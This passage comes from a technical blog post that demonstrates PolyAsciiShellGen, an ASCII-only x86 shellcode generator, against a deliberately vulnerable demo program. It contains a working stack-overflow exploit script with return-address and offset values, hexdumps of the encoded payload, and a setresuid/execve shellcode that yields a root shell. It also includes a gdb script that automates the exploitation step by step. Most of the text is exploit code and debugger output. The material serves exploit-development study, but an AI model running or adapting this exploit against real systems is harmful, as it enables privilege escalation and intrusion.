+(gdb) b *register_book+255
+Breakpoint 1 at 0x80492b5
+(gdb) b *register_book+412
+Breakpoint 2 at 0x8049352
+(gdb) set exec-wrapper ./exec_wrapper
+(gdb) run &lt; /tmp/payload_crash
+Starting program: /home/snake/Desktop/github_perso/PolyAsciiShellGen/demo/bin/vuln_ascii_filter_sample &lt;&lt;&lt; $(cat /tmp/payload_crash)
+
+[demo exec wrapper] Executing ./vuln_ascii_filter_sample
+
+[0xffffdc24] @b_info.comment
+[0xffffde24] @b_info.book_ref
+[+] Enter a book reference:
+[+] Enter a book commentary:
+
+Breakpoint 1, 0x080492b5 in register_book ()
+(gdb) x/16xw 0xffffde24
+0xffffde24:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffde34:     0x41414141      0x41414141      0xdeadbeef      0x41414141
+0xffffde44:     0x41414141      0x41414141      0x41414141      0xf7004141
+0xffffde54:     0xf7f9ce24      0x00000000      0xf7ddeb41      0x00000001
+(gdb) c
+Continuing.
+[+] Book registered.
+
+Breakpoint 2, 0x08049352 in register_book ()
+(gdb) x/16xw 0xffffde24
+0xffffde24:     0x41414141      <b class="ca">0x00000002      0x00000001</b>      0x41414141
+0xffffde34:     0x41414141      0x41414141      0xdeadbeef      0x41414141
+0xffffde44:     0x41414141      0x41414141      0x41414141      0xf7004141
+0xffffde54:     0xf7f9ce24      0x00000000      0xf7ddeb41      0x00000001
+</pre>
+         <p>
+          So, the exploitation conditions meet here are very restrictive, there is 12
+bytes exploitable before the return addresse and 18 bytes after the return
+address. This size is too small to store a payload which do more than
+          <a href="https://www.exploit-db.com/exploits/13358/" target="_blank">
+           open
+a shell [6]
+          </a>
+          .
+         </p>
+         <p>
+          The book comment buffer is a good place to store a payload, it have a size of
+512 bytes, it is located before the book reference buffer in the
+          <code>
+           b_info
+          </code>
+          structure, so it will not be overwritten by the previous stack buffer overflow.
+But, this buffer is restricted to ASCII data only, caused by an ASCII filter
+implemented with the
+          <code>
+           isprint()
+          </code>
+          function. The kind of ASCII shellcode see in
+the previous section is useful in this case of exploitation where a buffer
+overflow help to control the instruction pointer but lack of size to store a payload
+and where an other buffer have enough size to store a payload but is constraint
+to an ASCII filter.
+         </p>
+         <p>
+          Here the following
+          <code>
+           setresuid(0, 0, 0)
+          </code>
+          and
+          <code>
+           execve(/bin//sh,0,0)
+          </code>
+          shellcode
+is used. Its source
+          <a href="https://raw.githubusercontent.com/VincentDary/PolyAsciiShellGen/master/demo/setresuid_shellcode.asm" target="_blank">
+           <em>
+            setresuid_shellcode.asm
+           </em>
+           [4]
+          </a>
+          is available
+in the demo directory. It have a size of 37 bytes. According the
+PolyAsciiShellGen documentation the size of the shellcode to encode is padded
+to be aligned on a 32-bit boundary before to be encode, so its size pass from 37
+bytes to 40 bytes.
+         </p>
+         <pre class="bb">
+$ nasm setresuid_shellcode.asm
+$ stat --printf="%s" setresuid_shellcode
+37
+</pre>
+         <p>
+          PolyAsciiShellGen generates an ASCII shellcode with a size of 184 bytes for
+this shellcode.
+         </p>
+         <pre class="bb">
+$ echo -n  $(./PolyAsciiShellGen 100 0 \
+    $(hexdump -v -e '"\\" "x" 1/1 "%02X"' setresuid_shellcode)) | wc -c
+184
+</pre>
+         <p>
+          As see in the previous outputs, when the execution flow is hijack the ESP
+register point to
+          <code>
+           0xffffde40
+          </code>
+          and the
+          <code>
+           b_info.comment
+          </code>
+          buffer will store the ASCII
+shellcode start at
+          <code>
+           0xffffdc24
+          </code>
+          . The
+          <code>
+           esp offset
+          </code>
+          required to generate the ASCII
+shellcode can now be computed with all these informations.
+         </p>
+         <pre class="bb">
+$ perl -e "print(0xffffdc24 - 0xffffde40 + 40 + 184)"
+-316
+</pre>
+         <p>
+          The following shell script is used to generate the user inputs injected in
+the standard input of the vulnerable program exemple to exploit the stack
+buffer overflow in the
+          <code>
+           b_info.book_ref
+          </code>
+          buffer.
+         </p>
+         <p>
+          <a href="https://raw.githubusercontent.com/VincentDary/PolyAsciiShellGen/master/demo/exploit_ascii_filter_sample.sh" target="_blank">
+           <em>
+            exploit_ascii_filter_sample.sh
+           </em>
+          </a>
+         </p>
+         <div class="a">
+          <pre><span></span><code><span class="dk">#!/bin/bash</span>
+
+<span class="en">set</span><span class="fv"> </span>-e
+
+<span class="eq">ret_offset</span><span class="fp">=</span><span class="dq">"24"</span>
+<span class="eq">ret_addresse</span><span class="fp">=</span><span class="dq">"\x24\xdc\xff\xff"</span>
+<span class="eq">esp_offset</span><span class="fp">=</span><span class="dq">"-316"</span>
+<span class="eq">nop_factor</span><span class="fp">=</span><span class="dq">"0"</span>
+
+<span class="eq">input_book_ref</span><span class="fp">=</span><span class="fk">$(</span>perl<span class="fv"> </span>-e<span class="fv"> </span><span class="dq">"print 'A'x'</span><span class="eq">$ret_offset</span><span class="dq">'.'</span><span class="eq">$ret_addresse</span><span class="dq">'.'\n'"</span><span class="fk">)</span>
+
+<span class="eq">setresuid_shellcode</span><span class="fp">=</span><span class="fk">$(</span>hexdump<span class="fv"> </span>-v<span class="fv"> </span>-e<span class="fv"> </span><span class="dp">'"\\" "x" 1/1 "%02X"'</span><span class="fv"> </span>setresuid_shellcode<span class="fk">)</span>
+
+<span class="eq">ascii_shellcode</span><span class="fp">=</span><span class="fk">$(</span>./PolyAsciiShellGen<span class="fv"> </span><span class="eq">$esp_offset</span><span class="fv"> </span><span class="eq">$nop_factor</span><span class="fv"> </span><span class="eq">$setresuid_shellcode</span><span class="fk">)</span>
+
+<span class="en">echo</span><span class="fv"> </span>-e<span class="fv"> </span><span class="dq">"</span><span class="eq">$input_book_ref$ascii_shellcode</span><span class="dq">"</span>
+</code></pre>
+         </div>
+         <p>
+          The following output show the data content injected in the vulnerable program
+exemple. The data in red will overflow the
+          <code>
+           b_info.book_ref
+          </code>
+          buffer and the
+last four bytes in red will overwrite the return address of the
+          <code>
+           register_book()
+          </code>
+          function with the address
+          <code>
+           0xffffdc24
+          </code>
+          . The data in blue are the ASCII shellcode
+generated by
+          <code>
+           PolyAsciiShellGen
+          </code>
+          and will be store in the
+          <code>
+           b_info.comment
+          </code>
+          buffer located at
+          <code>
+           0xffffdc24
+          </code>
+          .
+         </p>
+         <pre class="bb">
+$ ./exploit_ascii_filter_sample.sh | hexdump -C
+00000000  <b class="ca">41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41</b>  |AAAAAAAAAAAAAAAA|
+00000010  <b class="ca">41 41 41 41 41 41 41 41  24 dc ff ff</b> 0a <b class="cd">54 58 2d</b>  |AAAAAAAA$....TX-|
+00000020  <b class="cd">76 76 76 76 2d 76 57 57  57 2d 50 33 32 32 50 5c</b>  |vvvv-vWWW-P322P\|
+00000030  <b class="cd">25 44 44 44 44 25 30 30  30 30 2d 49 42 42 42 2d</b>  |%DDDD%0000-IBBB-|
+00000040  <b class="cd">37 2d 2d 2d 50 2d 4e 4e  4e 4e 2d 72 4e 33 42 2d</b>  |7---P-NNNN-rN3B-|
+00000050  <b class="cd">6d 6a 2d 32 50 2d 31 31  31 31 2d 72 31 72 31 2d</b>  |mj-2P-1111-r1r1-|
+00000060  <b class="cd">56 72 72 31 2d 77 62 42  57 50 2d 37 4b 4b 64 2d</b>  |Vrr1-wbBWP-7KKd-|
+00000070  <b class="cd">25 4b 64 7a 2d 25 52 6b  7a 50 2d 74 74 74 74 2d</b>  |%Kdz-%RkzP-tttt-|
+00000080  <b class="cd">43 43 43 74 2d 38 49 4e  71 50 2d 5f 5f 5f 5f 2d</b>  |CCCt-8INqP-____-|
+00000090  <b class="cd">5f 5f 5f 5f 2d 64 41 7a  41 50 2d 65 30 34 65 2d</b>  |____-dAzAP-e04e-|
+000000a0  <b class="cd">65 30 25 65 2d 56 47 25  59 50 2d 54 76 6e 54 2d</b>  |e0%e-VG%YP-TvnT-|
+000000b0  <b class="cd">2d 79 74 36 50 2d 2d 33  33 33 2d 2d 64 33 33 2d</b>  |-yt6P--333--d33-|
+000000c0  <b class="cd">25 70 35 48 50 2d 56 56  56 56 2d 56 50 56 56 2d</b>  |%p5HP-VVVV-VPVV-|
+000000d0  <b class="cd">54 62 53 4a 50</b> 0a                                 |TbSJP.|
+000000d6
+</pre>
+         <p>
+          Here the exploitation of the vulnerable program exemple, a shell pop and the
+root privileges are restored.
+         </p>
+         <pre class="bb">
+$ ( ./exploit_ascii_filter_sample.sh; cat ) | ./exec_wrapper
+
+
+[demo exec wrapper] Executing ./vuln_ascii_filter_sample
+
+[0xffffdc24] @b_info.comment
+[0xffffde24] @b_info.book_ref
+[+] Enter a book reference:
+[+] Enter a book commentary:
+[+] Book registered.
+
+reference: AAAA�
+commentary: TX-vvvv-vWWW-P322P\%DDDD%0000-IBBB-7---P-NNNN-rN3B-mj-2P-1111-r1r1-Vrr1-wbBWP-7KKd-%Kdz-%RkzP-tttt-CCCt-8INqP-____-____-dAzAP-e04e-e0%e-VG%YP-TvnT--yt6P--333--d33-%p5HP-VVVV-VPVV-TbSJP
+
+whoami
+root
+
+</pre>
+         <p>
+          If the exploitation not work on your machine it is probably caused by somes
+stack offsets due to the recompilation of the program.
+It is possible to ajust quickly the
+          <code>
+           ret_offset
+          </code>
+          ,
+          <code>
+           ret_addresse
+          </code>
+          ,
+          <code>
+           esp_offset
+          </code>
+          variables of the
+          <code>
+           exploit_ascii_filter_sample.sh
+          </code>
+          script to match your
+exploitation conditions. Otherwise, the
+          <code>
+           demo
+          </code>
+          directory contains all the
+binaries used here.
+         </p>
+         <h3 id="45-automated-demo-in-gdb">
+          4.5 - Automated Demo in gdb
+         </h3>
+         <p>
+          A demo script is present in the demo directory of the repository. It automates
+the exploitation of the vulnerable program sample see in the previous section
+and provides two execution contexts options. A context in the debugger and an
+other context out of the debugger.
+         </p>
+         <p>
+          When the demo script is started in the debugger context it uses a gdb
+comand file which shows the exploitation of the vulnerable program example step
+by step with the dumps of the shellcode decoding process.
+         </p>
+         <p>
+          <a href="https://raw.githubusercontent.com/VincentDary/PolyAsciiShellGen/master/demo/exploit_ascii_filter_sample.gdb" target="_blank">
+           <em>
+            exploit_ascii_filter_sample.gdb
+           </em>
+          </a>
+         </p>
+         <pre class="bb">
+# hardcoded memory addresses
+
+## .code segment
+set $addr_first_fgets_call    = 0x8049255
+set $addr_strlen_call         = 0x80492b5
+
+## .stack segment
+set $addr_buffer_info_comment = 0xffffdc24
+set $addr_in_ascii_shellcode  = 0xffffdc91
+set $addr_esp_eip_crossing    = 0xffffdcdc
+
+
+define sleep_and_continue
+    shell sleep 1
+    continue
+end
+
+# Debug the stack overflow in b_info.book_ref
+define stack_overflow_dbg
+  break *$addr_first_fgets_call
+  commands
+    x/140xw $esp
+    x/i $eip
+    sleep_and_continue
+  end
+
+  break *$addr_strlen_call
+  commands
+    x/140xw $esp
+    x/i $eip
+    sleep_and_continue
+  end
+end
+
+# ASCII shellcode debuging
+define ascii_shellcode_dbg_break_settings
+  thbreak *$addr_buffer_info_comment
+  commands
+    x/48i $eip
+    i r $esp
+    sleep_and_continue
+  end
+
+  thbreak *$addr_in_ascii_shellcode
+  commands
+    x/40i $eip
+    i r $esp
+    sleep_and_continue
+  end
+
+  thbreak *$addr_esp_eip_crossing
+  commands
+    x/20i $eip
+    i r $eip
+    i r $esp
+    delete 1 2 3
+    sleep_and_continue
+  end
+end
+
+# main gdb function
+define exploit_ascii_filter_dbg
+
+    set disassembly-flavor intel
+    set height 0
+    set pagination off
+
+    set exec-wrapper ./exec_wrapper
+
+    break *main
+    commands
+        stack_overflow_dbg
+        ascii_shellcode_dbg_break_settings
+        x/3i *main+26
+        sleep_and_continue
+    end
+
+    run &lt; /tmp/exploit_ascii_filter_stdin_gdb
+
+end
+
+exploit_ascii_filter_dbg
+</pre>
+         <p>
+          The demo script can be started with the
+          <code>
+           in-gdb
+          </code>
+          option for the debugger
+context execution. The script starts to
+show the payload used for the debugging session and then it jumps in gdb.
+         </p>
+         <pre class="bb">
+$ PolyAsciiShellGen/demo/demo_PolyAsciiShellGen.sh in-gdb
+
+[Payload Generation]
+
+00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
+00000010  41 41 41 41 41 41 41 41  24 dc ff ff 0a 54 58 2d  |AAAAAAAA$....TX-|
+00000020  5a 5a 5a 5a 2d 78 5a 5a  5a 2d 6a 4c 4b 4b 50 5c  |ZZZZ-xZZZ-jLKKP\|
+00000030  25 52 52 52 52 25 25 25  25 25 2d 4b 4a 4a 4a 2d  |%RRRR%%%%%-KJJJ-|
+00000040  35 25 25 25 50 2d 6f 6f  55 55 2d 6f 55 25 36 2d  |5%%%P-ooUU-oU%6-|
+00000050  4f 42 34 37 50 2d 76 76  76 56 2d 76 76 76 4a 2d  |OB47P-vvvV-vvvJ-|
+00000060  38 25 38 25 2d 4c 25 33  25 50 2d 25 73 73 73 2d  |8%8%-L%3%P-%sss-|
+00000070  25 48 73 73 2d 37 2d 34  72 50 2d 50 50 50 76 2d  |%Hss-7-4rP-PPPv-|
+00000080  50 4d 50 76 2d 4f 63 65  6d 50 2d 72 72 72 72 2d  |PMPv-OcemP-rrrr-|
+00000090  42 42 72 42 2d 6e 4b 54  4b 50 2d 68 4f 25 68 2d  |BBrB-nKTKP-hO%h-|
+000000a0  68 25 25 68 2d 50 33 34  53 50 2d 4d 75 68 65 2d  |h%%h-P34SP-Muhe-|
+000000b0  34 7a 7a 25 50 2d 35 32  32 32 2d 25 5f 32 32 2d  |4zz%P-5222-%_22-|
+000000c0  25 76 37 4a 50 2d 59 59  59 59 2d 59 59 59 59 2d  |%v7JP-YYYY-YYYY-|
+000000d0  4e 56 4d 44 50 0a                                 |NVMDP.|
+
+
+Reading symbols from ./vuln_ascii_filter_sample...(no debugging symbols found)...done.
+Breakpoint 1 at 0x8049364s
+
+</pre>
+         <p>
+          Then, the demo break in the
+          <code>
+           register_book()
+          </code>
+          function. The following
+          <code>
+           gdb
+          </code>
+          output is displayed and shows in red the return address of the
+          <code>
+           register_book()
+          </code>
+          function on the stack before the stack smaching.
+         </p>
+         <pre class="aa">
+
+[demo exec wrapper] Executing ./vuln_ascii_filter_sample
+
+
+Breakpoint 1, 0x08049364 in main ()
+Breakpoint 2 at 0x8049255
+Breakpoint 3 at 0x80492b5
+Hardware assisted breakpoint 4 at 0xffffdc24
+Hardware assisted breakpoint 5 at 0xffffdc91
+Hardware assisted breakpoint 6 at 0xffffdcdc
+   0x804937e &lt;main+26&gt;: call   0x80491b6 <register_book>
+   <b class="ca">0x8049383</b> &lt;main+31&gt;: test   eax,eax
+   0x8049385 &lt;main+33&gt;: jns    0x80493a0 <main+60>
+[0xffffdc24] @b_info.comment
+[0xffffde24] @b_info.book_ref
+[+] Enter a book reference:
+
+Breakpoint 2, 0x08049255 in register_book ()
+0xffffdc10:     0xffffde24      0x0000002f      0xf7f9d580      0x080491c5
+0xffffdc20:     0x83743139      0x00000000      0x00000000      0x00000000
+0xffffdc30:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdc40:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdc50:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdc60:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdc70:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdc80:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdc90:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdca0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdcb0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdcc0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdcd0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdce0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdcf0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd00:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd10:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd20:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd30:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd40:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd50:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd60:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd70:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd80:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd90:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdda0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffddb0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffddc0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffddd0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdde0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffddf0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffde00:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffde10:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffde20:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffde30:     0x00000001      0x0804c000      0xffffde48      <b class="ca">0x08049383</b>
+=&gt; 0x8049255 &lt;register_book+159&gt;:       <b class="ca">call   0x8049040 &lt;fgets@plt&gt;</b>
+</main+60></register_book></pre>
+         <p>
+          Then, the demo breaks in the
+          <code>
+           register_book()
+          </code>
+          after the stack smaching. The
+following
+          <code>
+           gdb
+          </code>
+          output is displayed and shows in red the data which overflow the
+          <code>
+           b_info.book_ref
+          </code>
+          buffer and overwrite the return address of the
+          <code>
+           register_book()
+          </code>
+          function. The bytes in blue are the ASCII shellcode store in
+the
+          <code>
+           b_info.comment
+          </code>
+          buffer.
+         </p>
+         <pre class="aa">
+[+] Enter a book commentary:
+
+Breakpoint 3, 0x080492b5 in register_book ()
+0xffffdc10:     0xffffdc24      0x000001ff      0xf7f9d580      0x080491c5
+0xffffdc20:     0x83743139      <b class="cd">0x5a2d5854      0x2d5a5a5a      0x5a5a5a78</b>
+0xffffdc30:     <b class="cd">0x4b4c6a2d      0x255c504b      0x52525252      0x25252525</b>
+0xffffdc40:     <b class="cd">0x4a4b2d25      0x352d4a4a      0x50252525      0x556f6f2d</b>
+0xffffdc50:     <b class="cd">0x556f2d55      0x4f2d3625      0x50373442      0x7676762d</b>
+0xffffdc60:     <b class="cd">0x76762d56      0x382d4a76      0x2d253825      0x2533254c</b>
+0xffffdc70:     <b class="cd">0x73252d50      0x252d7373      0x2d737348      0x72342d37</b>
+0xffffdc80:     <b class="cd">0x50502d50      0x502d7650      0x2d76504d      0x6d65634f</b>
+0xffffdc90:     <b class="cd">0x72722d50      0x422d7272      0x2d427242      0x4b544b6e</b>
+0xffffdca0:     <b class="cd">0x4f682d50      0x682d6825      0x2d682525      0x53343350</b>
+0xffffdcb0:     <b class="cd">0x754d2d50      0x342d6568      0x50257a7a      0x3232352d</b>
+0xffffdcc0:     <b class="cd">0x5f252d32      0x252d3232      0x504a3776      0x5959592d</b>
+0xffffdcd0:     <b class="cd">0x59592d59      0x4e2d5959      0x50444d56</b>      0x0000000a
+0xffffdce0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdcf0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd00:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd10:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd20:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd30:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd40:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd50:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd60:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd70:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd80:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdd90:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdda0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffddb0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffddc0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffddd0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffdde0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffddf0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffde00:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffde10:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffde20:     0x00000000      <b class="ca">0x41414141      0x41414141      0x41414141</b>
+0xffffde30:     <b class="ca">0x41414141      0x41414141      0x41414141      0xffffdc24</b>
+=&gt; 0x80492b5 &lt;egister_book+255&gt;:       call   0x8049060 &lt;strlen@plt&gt;
+</pre>
+         <p>
+          Then, when the
+          <code>
+           register_book()
+          </code>
+          function returns, the execution flow is redirect
+to the ASCII shellcode and the demo breaks at the start address of the shellcode.
+The following disassembly listing of the ASCII
+shellcode is displayed. The instructions in green fix the stack pointer after the
+following ASCII machine code, the part in grey set eax to zero and the part in
+yellow build the original shellcode.
+         </p>
+         <pre class="aa">
+[+] Book registered.
+
+reference: AAAA�
+commentary: TX-ZZZZ-xZZZ-jLKKP\%RRRR%%%%%-KJJJ-5%%%P-ooUU-oU%6-OB47P-vvvV-vvvJ-8%8%-L%3%P-%sss-%Hss-7-4rP-PPPv-PMPv-OcemP-rrrr-BBrB-nKTKP-hO%h-h%%h-P34SP-Muhe-4zz%P-5222-%_22-%v7JP-YYYY-YYYY-NVMDP
+
+
+Temporary breakpoint 4, 0xffffdc24 in ?? ()
+=&gt; 0xffffdc24:  <b class="ce">push   esp</b>
+   0xffffdc25:  <b class="ce">pop    eax</b>
+   0xffffdc26:  <b class="ce">sub    eax,0x5a5a5a5a</b>
+   0xffffdc2b:  <b class="ce">sub    eax,0x5a5a5a78</b>
+   0xffffdc30:  <b class="ce">sub    eax,0x4b4b4c6a</b>
+   0xffffdc35:  <b class="ce">push   eax</b>
+   0xffffdc36:  <b class="ce">pop    esp</b>
+   0xffffdc37:  <b class="bs">and    eax,0x52525252</b>
+   0xffffdc3c:  <b class="bs">and    eax,0x25252525</b>
+   0xffffdc41:  <b class="bz">sub    eax,0x4a4a4a4b</b>
+   0xffffdc46:  <b class="bz">sub    eax,0x25252535</b>
+   0xffffdc4b:  <b class="bz">push   eax</b>
+   0xffffdc4c:  <b class="bz">sub    eax,0x55556f6f</b>
+   0xffffdc51:  <b class="bz">sub    eax,0x3625556f</b>
+   0xffffdc56:  <b class="bz">sub    eax,0x3734424f</b>
+   0xffffdc5b:  <b class="bz">push   eax</b>
+   0xffffdc5c:  <b class="bz">sub    eax,0x56767676</b>
+   0xffffdc61:  <b class="bz">sub    eax,0x4a767676</b>
+   0xffffdc66:  <b class="bz">sub    eax,0x25382538</b>
+   0xffffdc6b:  <b class="bz">sub    eax,0x2533254c</b>
+   0xffffdc70:  <b class="bz">push   eax</b>
+   0xffffdc71:  <b class="bz">sub    eax,0x73737325</b>
+   0xffffdc76:  <b class="bz">sub    eax,0x73734825</b>
+   0xffffdc7b:  <b class="bz">sub    eax,0x72342d37</b>
+   0xffffdc80:  <b class="bz">push   eax</b>
+   0xffffdc81:  <b class="bz">sub    eax,0x76505050</b>
+   0xffffdc86:  <b class="bz">sub    eax,0x76504d50</b>
+   0xffffdc8b:  <b class="bz">sub    eax,0x6d65634f</b>
+   0xffffdc90:  <b class="bz">push   eax</b>
+   0xffffdc91:  <b class="bz">sub    eax,0x72727272</b>
+   0xffffdc96:  <b class="bz">sub    eax,0x42724242</b>
+   0xffffdc9b:  <b class="bz">sub    eax,0x4b544b6e</b>
+   0xffffdca0:  <b class="bz">push   eax</b>
+   0xffffdca1:  <b class="bz">sub    eax,0x68254f68</b>
+   0xffffdca6:  <b class="bz">sub    eax,0x68252568</b>
+   0xffffdcab:  <b class="bz">sub    eax,0x53343350</b>
+   0xffffdcb0:  <b class="bz">push   eax</b>
+   0xffffdcb1:  <b class="bz">sub    eax,0x6568754d</b>
+   0xffffdcb6:  <b class="bz">sub    eax,0x257a7a34</b>
+   0xffffdcbb:  <b class="bz">push   eax</b>
+   0xffffdcbc:  <b class="bz">sub    eax,0x32323235</b>
+   0xffffdcc1:  <b class="bz">sub    eax,0x32325f25</b>
+   0xffffdcc6:  <b class="bz">sub    eax,0x4a377625</b>
+   0xffffdccb:  <b class="bz">push   eax</b>
+   0xffffdccc:  <b class="bz">sub    eax,0x59595959</b>
+   0xffffdcd1:  <b class="bz">sub    eax,0x59595959</b>
+   0xffffdcd6:  <b class="bz">sub    eax,0x444d564e</b>
+   0xffffdcdb:  <b class="bz">push   eax</b>
+esp            0xffffde40       0xffffde40
+</pre>
+         <p>
+          Then, the demo breaks in the middle execution of the ASCII shellcode. The
+following gdb output is displayed and shows in pink, the shellcode building
+as a bridge to join the code of the ASCII shellcode. The EIP register is
+growing up and the ESP register is growing down.
+         </p>
+         <pre class="aa">
+Temporary breakpoint 5, 0xffffdc91 in ?? ()
+=&gt; 0xffffdc91:  <b class="bz">sub    eax,0x72727272</b>
+   0xffffdc96:  <b class="bz">sub    eax,0x42724242</b>
+   0xffffdc9b:  <b class="bz">sub    eax,0x4b544b6e</b>
+   0xffffdca0:  <b class="bz">push   eax</b>
+   0xffffdca1:  <b class="bz">sub    eax,0x68254f68</b>
+   0xffffdca6:  <b class="bz">sub    eax,0x68252568</b>
+   0xffffdcab:  <b class="bz">sub    eax,0x53343350</b>
+   0xffffdcb0:  <b class="bz">push   eax</b>
+   0xffffdcb1:  <b class="bz">sub    eax,0x6568754d</b>
+   0xffffdcb6:  <b class="bz">sub    eax,0x257a7a34</b>
+   0xffffdcbb:  <b class="bz">push   eax</b>
+   0xffffdcbc:  <b class="bz">sub    eax,0x32323235</b>
+   0xffffdcc1:  <b class="bz">sub    eax,0x32325f25</b>
+   0xffffdcc6:  <b class="bz">sub    eax,0x4a377625</b>
+   0xffffdccb:  <b class="bz">push   eax</b>
+   0xffffdccc:  <b class="bz">sub    eax,0x59595959</b>
+   0xffffdcd1:  <b class="bz">sub    eax,0x59595959</b>
+   0xffffdcd6:  <b class="bz">sub    eax,0x444d564e</b>
+   0xffffdcdb:  <b class="bz">push   eax</b>
+   0xffffdcdc:  or     al,BYTE PTR [eax]
+   0xffffdcde:  add    BYTE PTR [eax],al
+   0xffffdce0:  add    BYTE PTR [eax],al
+   0xffffdce2:  add    BYTE PTR [eax],al
+   0xffffdce4:  add    BYTE PTR [eax],al
+   0xffffdce6:  add    BYTE PTR [eax],al
+   0xffffdce8:  add    BYTE PTR [eax],al
+   0xffffdcea:  add    BYTE PTR [eax],al
+   0xffffdcec:  add    BYTE PTR [eax],al
+   0xffffdcee:  add    BYTE PTR [eax],al
+   0xffffdcf0:  jae    0xffffdd5a
+   0xffffdcf2:  <b class="bl">push   0x6e69622f</b>
+   0xffffdcf7:  <b class="bl">mov    ebx,esp</b>
+   0xffffdcf9:  <b class="bl">push   ecx</b>
+   0xffffdcfa:  <b class="bl">mov    edx,esp</b>
+   0xffffdcfc:  <b class="bl">push   ebx</b>
+   0xffffdcfd:  <b class="bl">mov    ecx,esp</b>
+   0xffffdcff:  <b class="bl">int    0x80</b>
+   0xffffdd01:  <b class="bl">nop</b>
+   0xffffdd02:  <b class="bl">nop</b>
+   0xffffdd03:  <b class="bl">nop</b>
+esp            0xffffdcf0       0xffffdcf0
+</pre>
+         <p>
+          Then, the demo breaks at the first bytes of the decoded
+shellcode, the ESP and the EIP register are crossing at the
+same address and the shellcode will be executed.
+         </p>
+         <pre class="aa">
+Temporary breakpoint 6, 0xffffdcdc in ?? ()
+=&gt; 0xffffdcdc:  xor    eax,eax
+   0xffffdcde:  xor    ebx,ebx
+   0xffffdce0:  xor    ecx,ecx
+   0xffffdce2:  xor    edx,edx
+   0xffffdce4:  mov    al,0xd0
+   0xffffdce6:  int    0x80
+   0xffffdce8:  xor    eax,eax
+   0xffffdcea:  mov    al,0xb
+   0xffffdcec:  push   ecx
+   0xffffdced:  push   0x68732f2f
+   0xffffdcf2:  push   0x6e69622f
+   0xffffdcf7:  mov    ebx,esp
+   0xffffdcf9:  push   ecx
+   0xffffdcfa:  mov    edx,esp
+   0xffffdcfc:  push   ebx
+   0xffffdcfd:  mov    ecx,esp
+   0xffffdcff:  int    0x80
+   0xffffdd01:  nop
+   0xffffdd02:  nop
+   0xffffdd03:  nop
+<b class="ca">eip            0xffffdcdc</b>       0xffffdcdc
+<b class="ca">esp            0xffffdcdc</b>       0xffffdcdc
+process 28699 is executing new program: /usr/bin/bash
+warning: Could not load shared library symbols for linux-vdso.so.1.
+Do you need "set solib-search-path" or "set sysroot"?
+[Inferior 1 (process 28699) exited normally]
+</pre>
+         <h2 id="5-conclusion_1">
+          5 - conclusion
+         </h2>
+         <hr/>
+         <p>
+          The ASCII shellcode generation algorithm implements by PolyAsciiShellGen is not
+very efficient, as show in the debugging session for each group of 4 bytes
+from the original shellcode, 15 or 10 bytes are generated to decode the
+original shellcode. So if the shellcode to encode is very large in size the
+resulting ASCII shellcode will be very big, this is more or less a factor 3.
+If the target buffer where to store the payload is large it is not problem
+but when it is small this type of ASCII shellcode can't be used. The solution to
+circumvent this constraint is to implement a decoder loop with ASCII opcodes and
+encode the original shellcode with the reverse algorithm. There are many
+implementations of this idea which implement
+          <a href="../../blog-posts/polyasciishellgen-caezar-ascii-shellcode-generator/x86-base64-ASCII-shellcode-shellcoders-handbook.pdf" target="_blank">
+           base16, base64 or a derivate decoder
+loop [5]
+          </a>
+          in full ASCII machine code. The result is much more elegant than the
+          <em>
+           Caezar
+          </em>
+          ASCII shellcodes. But, the technique shows here was the first
+publicly documented and the technique of the
+          <em>
+           bridge building
+          </em>
+          is FUN and
+original.
